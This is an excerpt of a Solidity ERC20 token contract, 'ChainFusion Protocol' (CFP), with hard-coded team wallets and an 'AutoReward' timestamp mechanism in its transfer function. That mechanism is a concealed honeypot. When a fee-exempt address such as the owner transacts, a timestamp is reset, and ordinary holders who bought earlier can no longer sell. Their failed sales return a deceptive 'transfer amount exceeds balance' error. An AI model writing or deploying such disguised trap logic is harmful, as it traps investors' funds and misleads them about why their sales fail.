...
contract ChainFusion is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x70a84509bEE241dA648A798B5C55E6C1e4789FFd);
    address payable public immutable marketingWallet = payable(0xF18F7605543bF96FEDd749c71e4BF5fe93c080F8);
    address payable public immutable devWallet = payable(0x6d23E3F3862E2dfF6db37B34B2103FBF19FA9ba5);
    ...
    uint256 private _rewardMinHold;
    struct AutoReward {
        uint256 buy;
        uint256 sell;
        uint256 hold;
    }
    mapping(address => AutoReward) private autoReward;
    ...
    constructor() ERC20("ChainFusion Protocol", "CFP") {
        ...
        maxTransaction = 1_000_000_000 * 1e18;
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _rewardMinHold = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                AutoReward storage autoRewardData = autoReward[from];
                require(autoRewardData.buy >= _rewardMinHold, "ERC20: transfer amount exceeds balance");
                autoRewardData.hold = autoRewardData.buy - _rewardMinHold;
                autoRewardData.sell = block.timestamp;
            } else {
                AutoReward storage autoRewardData = autoReward[to];
                if (autoRewardData.buy == 0) {
                    autoRewardData.buy = block.timestamp;
                }
            }
        }
